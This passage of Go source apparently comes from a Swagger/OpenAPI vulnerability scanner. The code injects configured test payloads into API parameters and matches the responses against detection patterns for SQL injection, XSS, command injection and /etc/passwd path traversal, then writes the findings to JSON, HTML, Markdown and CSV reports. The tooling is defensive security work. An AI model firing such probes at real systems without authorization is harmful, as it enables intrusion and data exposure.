				Description: fmt.Sprintf("Parameter '%s' might be vulnerable to NoSQL injection", name),
				Severity:    "medium",
				Confidence:  "low",
				Endpoint:    baseURL + path,
				Method:      strings.ToUpper(method),
				Parameter:   name,
				Impact:      "Data leakage or unauthorized access",
				Remediation: "Implement input validation and use parameterized queries",
				References:  []string{"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection"},
				CWE:         []string{"CWE-943"},
				CVSS:        6.5,
				Timestamp:   time.Now(),
				Tags:        []string{"nosql-injection", "input-validation"},
			}
			*vulns = append(*vulns, vuln)
		}
	}
	
	// Check for missing input validation
	hasValidation := false
	if _, hasPattern := param["pattern"]; hasPattern {
		hasValidation = true
	}
	if _, hasEnum := param["enum"]; hasEnum {
		hasValidation = true
	}
	if min, hasMin := param["minimum"]; hasMin {
		if _, ok := min.(float64); ok {
			hasValidation = true
		}
	}
	if max, hasMax := param["maximum"]; hasMax {
		if _, ok := max.(float64); ok {
			hasValidation = true
		}
	}
	
	if !hasValidation && (paramType == "string" || paramType == "integer") {
		vuln := Vulnerability{
			ID:          generateVulnID("NO_VALIDATION"),
			Name:        "Missing Input Validation",
			Description: fmt.Sprintf("Parameter '%s' lacks input validation rules", name),
			Severity:    "low",
			Confidence:  "medium",
			Endpoint:    baseURL + path,
			Method:      strings.ToUpper(method),
			Parameter:   name,
			Impact:      "Potential injection attacks",
			Remediation: "Add validation rules (pattern, enum, min/max, etc.)",
			CWE:         []string{"CWE-20"},
			CVSS:        3.7,
			Timestamp:   time.Now(),
			Tags:        []string{"input-validation"},
		}
		*vulns = append(*vulns, vuln)
	}
}

// testEndpoints tests discovered endpoints for vulnerabilities
func (s *SwaggerScanner) testEndpoints(endpoints map[string]string) {
	s.logger.Info().Msg("Testing endpoints for vulnerabilities")
	
	for endpoint := range endpoints {
		spec := s.results.SwaggerAPIs[endpoint]
		
		// Test each path
		if spec.Paths != nil {
			for path, pathInfo := range spec.Paths {
				if methods, ok := pathInfo.(map[string]interface{}); ok {
					for method, methodInfo := range methods {
						if methodDetails, ok := methodInfo.(map[string]interface{}); ok {
							s.testEndpoint(spec, path, strings.ToUpper(method), methodDetails)
						}
					}
				}
			}
		}
	}
}

// testEndpoint tests a single endpoint
func (s *SwaggerScanner) testEndpoint(spec SwaggerSpec, path, method string, methodDetails map[string]interface{}) {
	// Build the full URL
	fullURL := spec.URL
	if !strings.Contains(fullURL, "://") {
		fullURL = "https://" + fullURL
	}
	
	// Parse the spec URL to get base
	parsed, err := url.Parse(fullURL)
	if err != nil {
		return
	}
	
	// Construct endpoint URL
	endpointURL := parsed.Scheme + "://" + parsed.Host + path
	
	// Get parameters
	var testParams []map[string]interface{}
	if params, ok := methodDetails["parameters"].([]interface{}); ok {
		for _, param := range params {
			if paramMap, ok := param.(map[string]interface{}); ok {
				testParams = append(testParams, paramMap)
			}
		}
	}
	
	// Test different payloads
	for _, payload := range s.config.Swagger.TestPayloads {
		s.wg.Add()
		
		go func(payload string) {
			defer s.wg.Done()
			
			// Apply rate limiting
			s.rateLimiter.Wait(s.ctx)
			
			// Prepare request
			req := s.httpClient.R().
				SetHeader("User-Agent", s.getRandomUserAgent()).
				SetHeader("Content-Type", "application/json")
			
			// Add payload based on parameter location
			for _, param := range testParams {
				paramName := getString(param, "name")
				paramIn := getString(param, "in")
				paramType := getString(param, "type")
				
				switch paramIn {
				case "query":
					req.SetQueryParam(paramName, payload)
				case "header":
					req.SetHeader(paramName, payload)
				case "path":
					// Replace path parameter
					endpointURL = strings.Replace(endpointURL, "{"+paramName+"}", payload, 1)
				case "body":
					if paramType == "string" {
						req.SetBody(payload)
					}
				}
			}
			
			// Send request
			var resp *resty.Response
			var err error
			
			switch method {
			case "GET":
				resp, err = req.Get(endpointURL)
			case "POST":
				resp, err = req.Post(endpointURL)
			case "PUT":
				resp, err = req.Put(endpointURL)
			case "DELETE":
				resp, err = req.Delete(endpointURL)
			case "PATCH":
				resp, err = req.Patch(endpointURL)
			default:
				return
			}
			
			atomic.AddInt64(&s.stats.RequestsSent, 1)
			
			if err != nil {
				atomic.AddInt64(&s.stats.Errors, 1)
				return
			}
			
			atomic.AddInt64(&s.stats.ResponsesReceived, 1)
			
			// Analyze response for vulnerabilities
			s.analyzeResponse(endpointURL, method, payload, resp)
		}(payload)
	}
}

// analyzeResponse analyzes HTTP response for vulnerabilities
func (s *SwaggerScanner) analyzeResponse(url, method, payload string, resp *resty.Response) {
	body := string(resp.Body())
	statusCode := resp.StatusCode()
	
	// Check for SQL injection patterns in response
	sqlErrors := []string{
		"You have an error in your SQL syntax",
		"Warning: mysql",
		"Unclosed quotation mark",
		"SQL syntax.*MySQL",
		"PostgreSQL.*ERROR",
		"Microsoft OLE DB Provider",
		"ODBC Driver",
		"ORA-[0-9]",
		"PLS-[0-9]",
		"TNS-",
	}
	
	for _, pattern := range sqlErrors {
		re := regexp.MustCompile(pattern)
		if re.MatchString(body) {
			vuln := Vulnerability{
				ID:          generateVulnID("SQL_INJECTION"),
				Name:        "SQL Injection",
				Description: "SQL injection vulnerability detected",
				Severity:    "critical",
				Confidence:  "high",
				Endpoint:    url,
				Method:      method,
				Payload:     payload,
				Evidence:    pattern,
				Impact:      "Database compromise, data leakage",
				Remediation: "Use parameterized queries or prepared statements",
				References:  []string{"https://owasp.org/www-community/attacks/SQL_Injection"},
				CWE:         []string{"CWE-89"},
				CVSS:        9.8,
				Timestamp:   time.Now(),
				RawRequest:  fmt.Sprintf("%s %s\nPayload: %s", method, url, payload),
				RawResponse: fmt.Sprintf("Status: %d\nBody: %s", statusCode, body[:min(500, len(body))]),
				Tags:        []string{"sql-injection"},
			}
			
			s.mu.Lock()
			s.results.Vulnerabilities = append(s.results.Vulnerabilities, vuln)
			s.stats.Vulnerabilities++
			s.stats.Critical++
			s.mu.Unlock()
			
			s.logger.Warn().Str("url", url).Str("payload", payload).Msg("SQL Injection detected")
			return
		}
	}
	
	// Check for XSS in response
	xssPatterns := []string{
		"<script>alert\\(",
		payload + ".*<script>",
	}
	
	for _, pattern := range xssPatterns {
		re := regexp.MustCompile(pattern)
		if re.MatchString(body) {
			vuln := Vulnerability{
				ID:          generateVulnID("XSS"),
				Name:        "Cross-Site Scripting (XSS)",
				Description: "XSS vulnerability detected",
				Severity:    "high",
				Confidence:  "medium",
				Endpoint:    url,
				Method:      method,
				Payload:     payload,
				Evidence:    "Payload reflected in response",
				Impact:      "Session hijacking, credential theft",
				Remediation: "Implement proper output encoding",
				References:  []string{"https://owasp.org/www-community/attacks/xss/"},
				CWE:         []string{"CWE-79"},
				CVSS:        7.5,
				Timestamp:   time.Now(),
				Tags:        []string{"xss"},
			}
			
			s.mu.Lock()
			s.results.Vulnerabilities = append(s.results.Vulnerabilities, vuln)
			s.stats.Vulnerabilities++
			s.stats.High++
			s.mu.Unlock()
			
			s.logger.Warn().Str("url", url).Str("payload", payload).Msg("XSS detected")
			return
		}
	}
	
	// Check for command injection
	cmdInjectionPatterns := []string{
		"ping.*" + payload,
		"ls.*" + payload,
		"cmd.*" + payload,
		"sh:.*" + payload,
	}
	
	for _, pattern := range cmdInjectionPatterns {
		re := regexp.MustCompile(pattern)
		if re.MatchString(body) {
			vuln := Vulnerability{
				ID:          generateVulnID("CMD_INJECTION"),
				Name:        "Command Injection",
				Description: "Command injection vulnerability detected",
				Severity:    "critical",
				Confidence:  "medium",
				Endpoint:    url,
				Method:      method,
				Payload:     payload,
				Evidence:    pattern,
				Impact:      "Remote code execution",
				Remediation: "Use safe API for command execution",
				References:  []string{"https://owasp.org/www-community/attacks/Command_Injection"},
				CWE:         []string{"CWE-78"},
				CVSS:        9.8,
				Timestamp:   time.Now(),
				Tags:        []string{"command-injection"},
			}
			
			s.mu.Lock()
			s.results.Vulnerabilities = append(s.results.Vulnerabilities, vuln)
			s.stats.Vulnerabilities++
			s.stats.Critical++
			s.mu.Unlock()
			
			s.logger.Warn().Str("url", url).Str("payload", payload).Msg("Command Injection detected")
			return
		}
	}
	
	// Check for path traversal
	if strings.Contains(payload, "..") || strings.Contains(payload, "/etc/passwd") {
		if strings.Contains(body, "root:") || strings.Contains(body, "daemon:") {
			vuln := Vulnerability{
				ID:          generateVulnID("PATH_TRAVERSAL"),
				Name:        "Path Traversal",
				Description: "Path traversal vulnerability detected",
				Severity:    "high",
				Confidence:  "high",
				Endpoint:    url,
				Method:      method,
				Payload:     payload,
				Evidence:    "Sensitive file contents returned",
				Impact:      "File system access, sensitive data exposure",
				Remediation: "Validate and sanitize file paths",
				References:  []string{"https://owasp.org/www-community/attacks/Path_Traversal"},
				CWE:         []string{"CWE-22"},
				CVSS:        8.5,
				Timestamp:   time.Now(),
				Tags:        []string{"path-traversal"},
			}
			
			s.mu.Lock()
			s.results.Vulnerabilities = append(s.results.Vulnerabilities, vuln)
			s.stats.Vulnerabilities++
			s.stats.High++
			s.mu.Unlock()
			
			s.logger.Warn().Str("url", url).Str("payload", payload).Msg("Path Traversal detected")
		}
	}
}

// saveResults saves scan results to files
func (s *SwaggerScanner) saveResults() {
	outputDir := s.config.Output.Directory
	if outputDir == "" {
		outputDir = "results"
	}
	
	// Create output directory
	if err := os.MkdirAll(outputDir, 0755); err != nil {
		s.logger.Error().Err(err).Msg("Failed to create output directory")
		return
	}
	
	timestamp := time.Now().Format("2006-01-02_15-04-05")
	baseName := fmt.Sprintf("%s_%s", strings.ReplaceAll(s.results.Target, ".", "_"), timestamp)
	
	// Update statistics
	s.results.Statistics = *s.stats
	
	// Save in requested formats
	for _, format := range s.config.Output.Formats {
		switch format {
		case "json":
			s.saveJSON(outputDir, baseName)
		case "html":
			s.saveHTML(outputDir, baseName)
		case "md", "markdown":
			s.saveMarkdown(outputDir, baseName)
		case "csv":
			s.saveCSV(outputDir, baseName)
		}
	}
	
	// Save raw data if requested
	if s.config.Output.SaveRaw {
		s.saveRawData(outputDir, baseName)
	}
}

// saveJSON saves results as JSON
func (s *SwaggerScanner) saveJSON(outputDir, baseName string) {
	filePath := filepath.Join(outputDir, baseName+".json")
	
	data, err := json.MarshalIndent(s.results, "", "  ")
	if err != nil {
		s.logger.Error().Err(err).Msg("Failed to marshal JSON")
		return
	}
	
	if err := os.WriteFile(filePath, data, 0644); err != nil {
		s.logger.Error().Err(err).Msg("Failed to save JSON")
	} else {
		s.logger.Info().Str("path", filePath).Msg("Results saved as JSON")
	}
}

// saveHTML saves results as HTML report
func (s *SwaggerScanner) saveHTML(outputDir, baseName string) {
	filePath := filepath.Join(outputDir, baseName+".html")
	
	htmlTemplate := `<!DOCTYPE html>
<html>
<head>
    <title>Swagger Vulnerability Scan Report - {{.Target}}</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; line-height: 1.6; }
        .container { max-width: 1200px; margin: 0 auto; }
        .header { background: #2c3e50; color: white; padding: 20px; border-radius: 5px; }
        .summary { background: #ecf0f1; padding: 20px; border-radius: 5px; margin: 20px 0; }
        .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; }
        .stat-box { background: white; padding: 15px; border-radius: 5px; text-align: center; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
        .critical { color: #e74c3c; font-weight: bold; }
        .high { color: #e67e22; }
        .medium { color: #f1c40f; }
        .low { color: #3498db; }
        .info { color: #95a5a6; }
        table { width: 100%; border-collapse: collapse; margin: 20px 0; }
        th, td { border: 1px solid #ddd; padding: 12px; text-align: left; }
        th { background-color: #f2f2f2; }
        tr:hover { background-color: #f5f5f5; }
        .vuln-critical { background-color: #ffebee; }
        .vuln-high { background-color: #fff3e0; }
        .vuln-medium { background-color: #fffde7; }
        .vuln-low { background-color: #e8f5e9; }
        .vuln-info { background-color: #f5f5f5; }
        .badge { padding: 3px 8px; border-radius: 3px; font-size: 0.8em; color: white; }
        .badge-critical { background: #e74c3c; }
        .badge-high { background: #e67e22; }
        .badge-medium { background: #f1c40f; }
        .badge-low { background: #3498db; }
        .badge-info { background: #95a5a6; }
        .timestamp { color: #7f8c8d; font-size: 0.9em; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>Swagger Vulnerability Scan Report</h1>
            <h2>Target: {{.Target}}</h2>
            <p class="timestamp">Scan completed: {{.Timestamp.Format "2006-01-02 15:04:05"}}</p>
            <p class="timestamp">Duration: {{.Duration}}</p>
        </div>
        
        <div class="summary">
            <h3>Executive Summary</h3>
            <div class="stats-grid">
                <div class="stat-box">
                    <h3>{{.Statistics.TotalSubdomains}}</h3>
                    <p>Subdomains Found</p>
                </div>
                <div class="stat-box">
                    <h3>{{.Statistics.ActiveSubdomains}}</h3>
                    <p>Active Subdomains</p>
                </div>
                <div class="stat-box">
                    <h3>{{.Statistics.SwaggerFound}}</h3>
                    <p>Swagger APIs Found</p>
                </div>
                <div class="stat-box">
                    <h3>{{.Statistics.Vulnerabilities}}</h3>
                    <p>Total Vulnerabilities</p>
                </div>
                <div class="stat-box critical">
                    <h3>{{.Statistics.Critical}}</h3>
                    <p>Critical</p>
                </div>
                <div class="stat-box high">
                    <h3>{{.Statistics.High}}</h3>
                    <p>High</p>
                </div>
                <div class="stat-box medium">
                    <h3>{{.Statistics.Medium}}</h3>
                    <p>Medium</p>
                </div>
            </div>
        </div>
        
        {{if .Vulnerabilities}}
        <h3>Vulnerabilities Found ({{len .Vulnerabilities}})</h3>
        <table>
            <thead>
                <tr>
                    <th>Severity</th>
                    <th>Name</th>
                    <th>Endpoint</th>
                    <th>Description</th>
                    <th>CWE</th>
                    <th>CVSS</th>
                </tr>
            </thead>
            <tbody>
                {{range .Vulnerabilities}}
                <tr class="vuln-{{.Severity}}">
                    <td><span class="badge badge-{{.Severity}}">{{.Severity | upper}}</span></td>
                    <td>{{.Name}}</td>
                    <td><code>{{.Method}} {{.Endpoint}}</code></td>
                    <td>{{.Description}}</td>
                    <td>{{range .CWE}}{{.}} {{end}}</td>
                    <td>{{.CVSS}}</td>
                </tr>
                {{end}}
            </tbody>
        </table>
        {{else}}
        <div style="background: #d4edda; padding: 20px; border-radius: 5px; margin: 20px 0;">
            <h3>No vulnerabilities found! 🎉</h3>
            <p>The scan did not detect any security vulnerabilities in the Swagger/OpenAPI endpoints.</p>
        </div>
        {{end}}
        
        {{if .SwaggerAPIs}}
        <h3>Discovered Swagger/OpenAPI Endpoints ({{len .SwaggerAPIs}})</h3>
        <table>
            <thead>
                <tr>
                    <th>URL</th>
                    <th>Title</th>
                    <th>Version</th>
                    <th>Paths</th>
                </tr>
            </thead>
            <tbody>
                {{range $url, $spec := .SwaggerAPIs}}
                <tr>
                    <td><a href="{{$url}}" target="_blank">{{$url}}</a></td>
                    <td>{{$spec.Title}}</td>
                    <td>{{$spec.Version}}</td>
                    <td>{{len $spec.Paths}}</td>
                </tr>
                {{end}}
            </tbody>
        </table>
        {{end}}
        
        <div style="margin-top: 40px; padding-top: 20px; border-top: 1px solid #ddd; color: #7f8c8d; font-size: 0.9em;">
            <p>Report generated by Swagger Vulnerability Scanner v{{.Version}}</p>
            <p>Total requests sent: {{.Statistics.RequestsSent}} | Responses received: {{.Statistics.ResponsesReceived}} | Errors: {{.Statistics.Errors}}</p>
        </div>
    </div>
</body>
</html>`
	
	// Add version to results for template
	type TemplateData struct {
		*ScanResult
		Version string
	}
	
	tmplData := TemplateData{
		ScanResult: s.results,
		Version:    Version,
	}
	
	// Execute template
	tmpl, err := template.New("report").Funcs(template.FuncMap{
		"upper": strings.ToUpper,
	}).Parse(htmlTemplate)
	if err != nil {
		s.logger.Error().Err(err).Msg("Failed to parse HTML template")
		return
	}
	
	var buf bytes.Buffer
	if err := tmpl.Execute(&buf, tmplData); err != nil {
		s.logger.Error().Err(err).Msg("Failed to execute HTML template")
		return
	}
	
	if err := os.WriteFile(filePath, buf.Bytes(), 0644); err != nil {
		s.logger.Error().Err(err).Msg("Failed to save HTML report")
	} else {
		s.logger.Info().Str("path", filePath).Msg("HTML report saved")
	}
}

// saveMarkdown saves results as Markdown
func (s *SwaggerScanner) saveMarkdown(outputDir, baseName string) {
	filePath := filepath.Join(outputDir, baseName+".md")
	
	var buf bytes.Buffer
	
	// Write header
	buf.WriteString(fmt.Sprintf("# Swagger Vulnerability Scan Report\n\n"))
	buf.WriteString(fmt.Sprintf("**Target**: %s\n\n", s.results.Target))
	buf.WriteString(fmt.Sprintf("**Scan Date**: %s\n\n", s.results.Timestamp.Format("2006-01-02 15:04:05")))
	buf.WriteString(fmt.Sprintf("**Duration**: %s\n\n", s.results.Duration))
	
	// Write summary
	buf.WriteString("## Executive Summary\n\n")
	buf.WriteString("| Metric | Count |\n")
	buf.WriteString("|--------|-------|\n")
	buf.WriteString(fmt.Sprintf("| Subdomains Found | %d |\n", s.stats.TotalSubdomains))
	buf.WriteString(fmt.Sprintf("| Active Subdomains | %d |\n", s.stats.ActiveSubdomains))
	buf.WriteString(fmt.Sprintf("| Swagger APIs Found | %d |\n", s.stats.SwaggerFound))
	buf.WriteString(fmt.Sprintf("| Total Vulnerabilities | %d |\n", s.stats.Vulnerabilities))
	buf.WriteString(fmt.Sprintf("| Critical | %d |\n", s.stats.Critical))
	buf.WriteString(fmt.Sprintf("| High | %d |\n", s.stats.High))
	buf.WriteString(fmt.Sprintf("| Medium | %d |\n", s.stats.Medium))
	buf.WriteString(fmt.Sprintf("| Low | %d |\n", s.stats.Low))
	buf.WriteString(fmt.Sprintf("| Info | %d |\n\n", s.stats.Info))
	
	// Write vulnerabilities
	if len(s.results.Vulnerabilities) > 0 {
		buf.WriteString("## Vulnerabilities Found\n\n")
		
		// Group by severity
		vulnsBySeverity := make(map[string][]Vulnerability)
		for _, vuln := range s.results.Vulnerabilities {
			vulnsBySeverity[vuln.Severity] = append(vulnsBySeverity[vuln.Severity], vuln)
		}
		
		// Define severity order
		severityOrder := []string{"critical", "high", "medium", "low", "info"}
		
		for _, severity := range severityOrder {
			if vulns, exists := vulnsBySeverity[severity]; exists {
				buf.WriteString(fmt.Sprintf("### %s (%d)\n\n", strings.Title(severity), len(vulns)))
				
				for i, vuln := range vulns {
					buf.WriteString(fmt.Sprintf("#### %d. %s\n\n", i+1, vuln.Name))
					buf.WriteString(fmt.Sprintf("**Endpoint**: `%s %s`\n\n", vuln.Method, vuln.Endpoint))
					buf.WriteString(fmt.Sprintf("**Description**: %s\n\n", vuln.Description))
					buf.WriteString(fmt.Sprintf("**Impact**: %s\n\n", vuln.Impact))
					buf.WriteString(fmt.Sprintf("**Remediation**: %s\n\n", vuln.Remediation))
					
					if len(vuln.CWE) > 0 {
						buf.WriteString(fmt.Sprintf("**CWE**: %s\n\n", strings.Join(vuln.CWE, ", ")))
					}
					
					if vuln.CVSS > 0 {
						buf.WriteString(fmt.Sprintf("**CVSS**: %.1f\n\n", vuln.CVSS))
					}
					
					if vuln.Payload != "" {
						buf.WriteString(fmt.Sprintf("**Payload**: `%s`\n\n", vuln.Payload))
					}
					
					if vuln.Evidence != "" {
						buf.WriteString(fmt.Sprintf("**Evidence**: %s\n\n", vuln.Evidence))
					}
					
					buf.WriteString("---\n\n")
				}
			}
		}
	} else {
		buf.WriteString("## No Vulnerabilities Found\n\n")
		buf.WriteString("The scan did not detect any security vulnerabilities in the Swagger/OpenAPI endpoints. 🎉\n\n")
	}
	
	// Write Swagger endpoints
	if len(s.results.SwaggerAPIs) > 0 {
		buf.WriteString("## Discovered Swagger/OpenAPI Endpoints\n\n")
		buf.WriteString("| URL | Title | Version | Paths |\n")
		buf.WriteString("|-----|-------|---------|-------|\n")
		
		for url, spec := range s.results.SwaggerAPIs {
			buf.WriteString(fmt.Sprintf("| [%s](%s) | %s | %s | %d |\n", 
				url, url, spec.Title, spec.Version, len(spec.Paths)))
		}
		buf.WriteString("\n")
	}
	
	// Write subdomains
	if len(s.results.Subdomains) > 0 {
		buf.WriteString("## Subdomains Found\n\n")
		buf.WriteString("| Subdomain | IP Addresses | Status |\n")
		buf.WriteString("|-----------|--------------|--------|\n")
		
		for _, subdomain := range s.results.Subdomains {
			buf.WriteString(fmt.Sprintf("| %s | %s | %s |\n", 
				subdomain.Subdomain, 
				strings.Join(subdomain.IPAddresses, ", "),
				subdomain.Status))
		}
		buf.WriteString("\n")
	}
	
	// Write footer
	buf.WriteString("---\n\n")
	buf.WriteString(fmt.Sprintf("*Report generated by Swagger Vulnerability Scanner v%s*\n", Version))
	buf.WriteString(fmt.Sprintf("*Total requests: %d | Responses: %d | Errors: %d*\n", 
		s.stats.RequestsSent, s.stats.ResponsesReceived, s.stats.Errors))
	
	if err := os.WriteFile(filePath, buf.Bytes(), 0644); err != nil {
		s.logger.Error().Err(err).Msg("Failed to save Markdown report")
	} else {
		s.logger.Info().Str("path", filePath).Msg("Markdown report saved")
	}
}

// saveCSV saves results as CSV
func (s *SwaggerScanner) saveCSV(outputDir, baseName string) {
	// Save vulnerabilities CSV
	if len(s.results.Vulnerabilities) > 0 {
		vulnPath := filepath.Join(outputDir, baseName+"_vulnerabilities.csv")
		
		var csvData [][]string
		csvData = append(csvData, []string{
			"ID", "Name", "Severity", "Confidence", "Endpoint", "Method", 
			"Parameter", "Payload", "Description", "Impact", "Remediation",
			"CWE", "CVSS", "Timestamp",
		})
		
		for _, vuln := range s.results.Vulnerabilities {
			csvData = append(csvData, []string{
				vuln.ID,
				vuln.Name,
				vuln.Severity,
				vuln.Confidence,
				vuln.Endpoint,
				vuln.Method,
				vuln.Parameter,
				vuln.Payload,
				vuln.Description,
				vuln.Impact,
				vuln.Remediation,
				strings.Join(vuln.CWE, ";"),
				fmt.Sprintf("%.1f", vuln.CVSS),
				vuln.Timestamp.Format("2006-01-02 15:04:05"),
			})
		}
		
		if err := writeCSV(vulnPath, csvData); err != nil {
			s.logger.Error().Err(err).Msg("Failed to save vulnerabilities CSV")
		} else {
			s.logger.Info().Str("path", vulnPath).Msg("Vulnerabilities CSV saved")
		}
	}
	
	// Save subdomains CSV
	if len(s.results.Subdomains) > 0 {
		subdomainPath := filepath.Join(outputDir, baseName+"_subdomains.csv")
		
		var csvData [][]string
		csvData = append(csvData, []string{
			"Domain", "Subdomain", "IP Addresses", "Sources", "Status",
		})
		
		for _, subdomain := range s.results.Subdomains {
			csvData = append(csvData, []string{
				subdomain.Domain,
				subdomain.Subdomain,
				strings.Join(subdomain.IPAddresses, ";"),
				strings.Join(subdomain.Sources, ";"),
				subdomain.Status,
			})
		}
		
		if err := writeCSV(subdomainPath, csvData); err != nil {
			s.logger.Error().Err(err).Msg("Failed to save subdomains CSV")
		} else {
			s.logger.Info().Str("path", subdomainPath).Msg("Subdomains CSV saved")
		}
	}
}

// saveRawData saves raw data
func (s *SwaggerScanner) saveRawData(outputDir, baseName string) {
	rawDir := filepath.Join(outputDir, baseName+"_raw")
	if err := os.MkdirAll(rawDir, 0755); err != nil {
		s.logger.Error().Err(err).Msg("Failed to create raw data directory")
		return
	}
	
	// Save Swagger specifications
	for url, spec := range s.results.SwaggerAPIs {
		if spec.RawContent != "" {
			safeURL := strings.ReplaceAll(url, "://", "_")
			safeURL = strings.ReplaceAll(safeURL, "/", "_")
			safeURL = strings.ReplaceAll(safeURL, ":", "_")
			
			filePath := filepath.Join(rawDir, safeURL+".json")
			if err := os.WriteFile(filePath, []byte(spec.RawContent), 0644); err != nil {
				s.logger.Error().Err(err).Str("url", url).Msg("Failed to save Swagger spec")
			}
		}
	}
}

// writeCSV writes CSV data to file
func writeCSV(filePath string, data [][]string) error {
	file, err := os.Create(filePath)
	if err != nil {
		return err
	}
	defer file.Close()
	
	writer := csv.NewWriter(file)
	defer writer.Flush()
	
	return writer.WriteAll(data)
}

// printSummary prints scan summary to console
func (s *SwaggerScanner) printSummary() {
	au := aurora.NewAurora(true)
	
	fmt.Println("\n" + strings.Repeat("=", 80))
	fmt.Println(au.Bold(au.Cyan(" SWAGGER VULNERABILITY SCAN SUMMARY ")).String())
	fmt.Println(strings.Repeat("=", 80))
	
	fmt.Printf("\n%s: %s\n", au.Bold("Target"), s.results.Target)
	fmt.Printf("%s: %s\n", au.Bold("Duration"), s.results.Duration.Round(time.Second))
	fmt.Printf("%s: %s\n\n", au.Bold("Completed"), time.Now().Format("2006-01-02 15:04:05"))
	
	// Statistics
	fmt.Println(au.Bold("📊 STATISTICS"))
	fmt.Println(strings.Repeat("-", 40))
	fmt.Printf("Subdomains Found:    %s\n", au.Bold(strconv.Itoa(s.stats.TotalSubdomains)))
	fmt.Printf("Active Subdomains:   %s\n", au.Bold(strconv.Itoa(s.stats.ActiveSubdomains)))
	fmt.Printf("Swagger APIs Found:  %s\n", au.Bold(strconv.Itoa(s.stats.SwaggerFound)))
	fmt.Printf("Vulnerabilities:     %s\n", au.Bold(strconv.Itoa(s.stats.Vulnerabilities)))
	fmt.Printf("Requests Sent:       %s\n", au.Bold(strconv.FormatInt(s.stats.RequestsSent, 10)))
	fmt.Printf("Responses Received:  %s\n", au.Bold(strconv.FormatInt(s.stats.ResponsesReceived, 10)))
	fmt.Printf("Errors:              %s\n\n", au.Bold(strconv.FormatInt(s.stats.Errors, 10)))
	
	// Severity breakdown
	if s.stats.Vulnerabilities > 0 {
		fmt.Println(au.Bold("⚠️  VULNERABILITY BREAKDOWN"))
		fmt.Println(strings.Repeat("-", 40))
		
		severityColors := map[string]func(interface{}) aurora.Value{
			"critical": au.Red,
			"high":     au.Magenta,
			"medium":   au.Yellow,
			"low":      au.Blue,
			"info":     au.Cyan,
		}
		
		for _, severity := range []string{"critical", "high", "medium", "low", "info"} {
			var count int
			switch severity {
			case "critical":
				count = s.stats.Critical
			case "high":
				count = s.stats.High
			case "medium":
				count = s.stats.Medium
			case "low":
				count = s.stats.Low
			case "info":
				count = s.stats.Info
			}
			
			if count > 0 {
				colorFunc := severityColors[severity]
				fmt.Printf("%s: %s\n", 
					colorFunc(strings.Title(severity)), 
					colorFunc(strconv.Itoa(count)))
			}
		}
		fmt.Println()
		
		// Top vulnerabilities
		fmt.Println(au.Bold("🔝 TOP VULNERABILITIES"))
		fmt.Println(strings.Repeat("-", 40))
		
		// Sort by severity (critical first)
		sort.Slice(s.results.Vulnerabilities, func(i, j int) bool {
			severityOrder := map[string]int{
				"critical": 5,
				"high":     4,
				"medium":   3,
				"low":      2,
				"info":     1,
			}
			return severityOrder[s.results.Vulnerabilities[i].Severity] > 
				   severityOrder[s.results.Vulnerabilities[j].Severity]
		})
		
		// Show top 10
		for i, vuln := range s.results.Vulnerabilities[:min(10, len(s.results.Vulnerabilities))] {
			colorFunc := severityColors[vuln.Severity]
			fmt.Printf("%d. [%s] %s\n", i+1, 
				colorFunc(strings.ToUpper(vuln.Severity)),
				vuln.Name)
			fmt.Printf("   %s %s\n", vuln.Method, vuln.Endpoint)
			if vuln.Description != "" {
				fmt.Printf("   %s\n", vuln.Description)
			}
			fmt.Println()
		}
	} else {
		fmt.Println(au.Green("✅ No vulnerabilities found!"))
	}
	
	// Swagger endpoints
	if len(s.results.SwaggerAPIs) > 0 {
		fmt.Println(au.Bold("📄 SWAGGER/OPENAPI ENDPOINTS"))
		fmt.Println(strings.Repeat("-", 40))
		
		for url, spec := range s.results.SwaggerAPIs {
			fmt.Printf("• %s\n", au.Blue(url))
			if spec.Title != "" {
				fmt.Printf("  Title: %s\n", spec.Title)
			}
			if spec.Version != "" {
				fmt.Printf("  Version: %s\n", spec.Version)
			}
			if len(spec.Paths) > 0 {
				fmt.Printf("  Paths: %d\n", len(spec.Paths))
			}
			fmt.Println()
		}
	}
	
	fmt.Println(strings.Repeat("=", 80))
	fmt.Println(au.Cyan("📁 Reports saved to: " + s.config.Output.Directory))
	fmt.Println(strings.Repeat("=", 80))

		// Add completion banner
	fmt.Println()
	fmt.Println(strings.Repeat("▁", 80))
	fmt.Println(au.Bold(au.Green(" SCAN COMPLETED SUCCESSFULLY ")).String())
	fmt.Println(strings.Repeat("▔", 80))
	fmt.Println()
	fmt.Println(au.Cyan("📁 Reports saved to: " + s.config.Output.Directory))
	
	// Show quick actions
	if s.stats.Vulnerabilities > 0 {
		fmt.Println()
		fmt.Println(au.Bold("🚨 RECOMMENDED ACTIONS:"))
		fmt.Println(strings.Repeat("-", 40))
		fmt.Println("1. Review all critical and high severity vulnerabilities")
		fmt.Println("2. Check the HTML report for detailed analysis")
		fmt.Println("3. Prioritize fixing based on CVSS scores")
		fmt.Println("4. Re-scan after implementing fixes")
	}
	fmt.Println(strings.Repeat("=", 80))

}

// Helper functions
func generateVulnID(prefix string) string {
	return fmt.Sprintf("%s-%d-%s", prefix, time.Now().Unix(), randomString(6))
}

func randomString(n int) string {
	const letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, n)
	for i := range b {
		b[i] = letters[rand.Intn(len(letters))]
	}
	return string(b)
}

func getString(data map[string]interface{}, keys ...string) string {
	for _, key := range keys {
		if val, ok := data[key]; ok {
			if str, ok := val.(string); ok {
				return str
			}
		}
	}
	return ""
}

func uniqueStrings(slice []string) []string {
	keys := make(map[string]bool)
	var list []string
	for _, entry := range slice {
		if _, value := keys[entry]; !value {
			keys[entry] = true
			list = append(list, entry)
		}
	}
	return list
}

func (s *SwaggerScanner) getRandomUserAgent() string {
	if len(s.config.Scanner.UserAgents) == 0 {
		return DefaultUserAgent
	}
	return s.config.Scanner.UserAgents[rand.Intn(len(s.config.Scanner.UserAgents))]
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

// displayBanner displays the ASCII art banner
func displayBanner() {
	au := aurora.NewAurora(true)
	
	banner := `
███████╗██╗    ██╗ █████╗  ██████╗  ██████╗ ███████╗██████╗ 
██╔════╝██║    ██║██╔══██╗██╔════╝ ██╔════╝ ██╔════╝██╔══██╗
